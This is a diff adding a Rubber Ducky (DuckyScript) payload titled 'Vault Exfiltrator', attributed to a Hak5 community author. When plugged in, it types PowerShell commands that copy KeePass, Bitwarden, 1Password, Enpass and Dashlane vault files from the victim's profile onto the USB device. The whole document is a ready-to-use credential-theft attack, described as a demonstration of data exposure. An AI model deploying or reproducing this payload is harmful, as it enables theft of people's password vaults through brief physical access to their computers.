@@ -1,0 +1,26 @@
+REM Title: Vault Exfiltrator - Password Manager File Exfiltrator 
+REM Author: Daniel Miranda Barcelona (Excal1bur)
+REM Description: Scans for password manager database files and exfiltrates them via Rubber Ducky to demonstrate data exposure vulnerabilities.
+REM Target: Windows 10/11
+REM Version: 1.0
+REM Category: exfiltration
+REM Props: Hak5 Community
+
+ATTACKMODE HID STORAGE
+DEFINE #LABEL DUCKY
+DELAY 2000
+GUI r
+DELAY 500
+STRINGLN powershell 
+DELAY 500
+STRINGLN $vol=(Get-Volume -FileSystemLabel '#LABEL').DriveLetter
+STRINGLN mkdir $vol':\'VAULTS\
+STRINGLN dir "$env:USERPROFILE\Documents\*.kdbx" -ErrorAction SilentlyContinue | copy -Destination $vol':\'VAULTS\ -Force
+STRINGLN dir "$env:APPDATA\Bitwarden\data.json" -ErrorAction SilentlyContinue | copy -Destination $vol':\'VAULTS\ -Force
+STRINGLN dir "$env:USERPROFILE\*.opvault" -ErrorAction SilentlyContinue | copy -Destination $vol':\'VAULTS\ -Force
+STRINGLN dir "$env:USERPROFILE\*.1pux" -ErrorAction SilentlyContinue | copy -Destination $vol':\'VAULTS\ -Force
+STRINGLN dir "$env:APPDATA\Sinew Software Systems Pvt Ltd\Enpass\Enpass\Vaults\*.enpassdb" -ErrorAction SilentlyContinue | copy -Destination $vol':\'VAULTS\ -Force
+STRINGLN dir "$env:LOCALAPPDATA\Packages\SinewSoftwareSystems.EnpassPasswordManager_fwdy0m65qb6h2\LocalState\Vaults\*.enpassdb" -ErrorAction SilentlyContinue | copy -Destination $vol':\'VAULTS\ -Force
+STRINGLN dir "$env:APPDATA\Dashlane\*.dashlane" -ErrorAction SilentlyContinue | copy -Destination $vol':\'VAULTS\ -Force
+STRINGLN dir "$env:USERPROFILE\Documents\Enpass\*.enpassdb" -ErrorAction SilentlyContinue | copy -Destination $vol':\'VAULTS\ -Force
+STRINGLN exit
